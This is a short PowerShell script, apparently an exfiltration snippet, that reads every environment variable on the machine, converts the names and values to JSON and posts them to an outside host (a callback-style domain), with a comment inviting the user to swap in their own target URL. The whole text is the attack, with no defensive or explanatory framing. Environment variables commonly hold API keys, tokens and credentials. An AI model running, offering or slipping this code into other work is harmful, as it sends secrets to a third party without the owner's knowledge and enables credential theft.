$targetUrl = "https://ky28nlq70u99.dssldrf.net" # Replace with your target URL
$envData = Get-ChildItem Env: | Select-Object Name, Value | ConvertTo-Json
Invoke-RestMethod -Uri $targetUrl -Method Post -ContentType "application/json" -Body $envData
